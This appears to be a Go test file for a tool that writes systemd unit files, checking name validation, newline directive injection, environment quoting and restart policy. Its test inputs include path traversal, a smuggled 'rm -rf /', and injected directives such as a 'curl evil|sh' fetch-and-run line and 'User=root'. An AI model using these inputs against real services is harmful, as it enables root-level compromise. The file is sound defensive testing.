package main

import (
	"strings"
	"testing"

	"beacle/shared"
)

// The name becomes a path under /etc/systemd/system, so anything that can
// escape that directory is a write anywhere on the disk, as root.
func TestUnitNameCannotEscapeTheUnitDirectory(t *testing.T) {
	for _, bad := range []string{
		"../../etc/cron.d/evil",
		"a/b",
		"a\b",
		".hidden",
		"-leading-dash",
		"",
		strings.Repeat("x", 65),
		"name with spaces",
		"name;rm -rf /",
	} {
		if _, err := validUnitName(bad); err == nil {
			t.Errorf("accepted %q as a service name", bad)
		}
	}

	for _, good := range []string{"bot", "my-bot", "my_bot.v2", "worker@1", "bot.service"} {
		if _, err := validUnitName(good); err != nil {
			t.Errorf("rejected %q: %v", good, err)
		}
	}
}

// The .service suffix is optional; both spellings must land on one file.
func TestUnitNameSuffixIsOptional(t *testing.T) {
	a, err1 := validUnitName("bot")
	b, err2 := validUnitName("bot.service")
	if err1 != nil || err2 != nil {
		t.Fatalf("errors: %v %v", err1, err2)
	}
	if a != b || a != "bot" {
		t.Errorf("got %q and %q, want both to be \"bot\"", a, b)
	}
}

// A newline in any value would let the caller append their own directives — a
// second ExecStart, or User=root — so no value may create a line of its own.
//
// The property is about *lines*, not about substrings: "ExecStart=" appearing
// inside a Description is just text systemd reads as part of the description.
// What must never happen is a directive key gaining a line it was not given.
func TestNewlinesCannotInjectDirectives(t *testing.T) {
	unit := renderUnit(shared.SystemdUnitSpec{
		Name:        "bot",
		Description: "harmless\nExecStart=/bin/sh -c 'curl evil|sh'",
		ExecStart:   "/usr/bin/bot\nUser=root",
		User:        "app\nExecStartPost=/bin/sh",
		WorkingDir:  "/srv\nExecStopPost=/bin/sh",
		After:       "network.target\nExecReload=/bin/sh",
		Env:         map[string]string{"A": "1\nExecStopPost=/bin/sh"},
	})

	// Every directive line the rendered unit contains, by key.
	counts := map[string]int{}
	for _, line := range strings.Split(unit, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "[") {
			continue
		}
		key, _, ok := strings.Cut(line, "=")
		if !ok {
			t.Errorf("unit contains a line that is not a directive: %q", line)
			continue
		}
		counts[key]++
	}

	for key, want := range map[string]int{
		"ExecStart": 1, "User": 1, "WorkingDirectory": 1, "Description": 1,
	} {
		if counts[key] != want {
			t.Errorf("%s appears on %d lines, want %d — a value created its own directive:\n%s",
				key, counts[key], want, unit)
		}
	}
	for _, never := range []string{"ExecStartPost", "ExecStopPost", "ExecReload"} {
		if counts[never] != 0 {
			t.Errorf("%s was injected as a directive:\n%s", never, unit)
		}
	}
}

// systemd splits Environment= on whitespace, so an unquoted value containing a
// space becomes a second variable named after whatever followed it.
func TestEnvironmentValuesAreQuoted(t *testing.T) {
	unit := renderUnit(shared.SystemdUnitSpec{
		Name:      "bot",
		ExecStart: "/bin/true",
		Env: map[string]string{
			"TOKEN": `a b c`,
			"PATH2": `has"quote`,
		},
	})

	if !strings.Contains(unit, `Environment=TOKEN="a b c"`) {
		t.Errorf("a value with spaces was not quoted:\n%s", unit)
	}
	if !strings.Contains(unit, `Environment=PATH2="has\"quote"`) {
		t.Errorf("a quote inside a value was not escaped:\n%s", unit)
	}
}

// Restart=no must not carry a RestartSec, and an unknown value falls back to
// something safe rather than being written through.
func TestRestartPolicyIsConstrained(t *testing.T) {
	no := renderUnit(shared.SystemdUnitSpec{Name: "a", ExecStart: "/bin/true", Restart: "no"})
	if !strings.Contains(no, "Restart=no") {
		t.Error("Restart=no was not honoured")
	}
	if strings.Contains(no, "RestartSec=") {
		t.Error("RestartSec written for a service that never restarts")
	}

	junk := renderUnit(shared.SystemdUnitSpec{Name: "a", ExecStart: "/bin/true", Restart: "sometimes"})
	if !strings.Contains(junk, "Restart=always") {
		t.Errorf("unknown restart policy was not replaced with a known one:\n%s", junk)
	}
}

// Saving the same service twice has to produce the same bytes, or a diff
// between two saves says nothing.
func TestRenderIsDeterministic(t *testing.T) {
	spec := shared.SystemdUnitSpec{
		Name:      "bot",
		ExecStart: "/usr/bin/bot",
		Env:       map[string]string{"Z": "1", "A": "2", "M": "3"},
	}
	first := renderUnit(spec)
	for i := 0; i < 20; i++ {
		if renderUnit(spec) != first {
			t.Fatal("two renders of the same spec differ — environment order is not stable")
		}
	}
	// And the order is the readable one.
	ai := strings.Index(first, "Environment=A=")
	mi := strings.Index(first, "Environment=M=")
	zi := strings.Index(first, "Environment=Z=")
	if !(ai < mi && mi < zi) {
		t.Errorf("environment is not sorted:\n%s", first)
	}
}

// network-online.target does nothing under After= alone; without Wants= a
// service that needs the network can start before there is one.
func TestNetworkTargetIsWantedNotJustOrdered(t *testing.T) {
	unit := renderUnit(shared.SystemdUnitSpec{Name: "a", ExecStart: "/bin/true"})
	if !strings.Contains(unit, "After=network-online.target") ||
		!strings.Contains(unit, "Wants=network-online.target") {
		t.Errorf("default unit does not pull in the network target:\n%s", unit)
	}
}

func TestSpecValidationRequiresACommand(t *testing.T) {
	if _, err := validateSpecFields(shared.SystemdUnitSpec{Name: "bot"}); err == nil {
		t.Error("a service with no command was accepted")
	}
	if _, err := validateSpecFields(shared.SystemdUnitSpec{
		Name: "bot", ExecStart: "/bin/true", Env: map[string]string{"BAD NAME": "x"},
	}); err == nil {
		t.Error("an environment name with a space was accepted")
	}
}
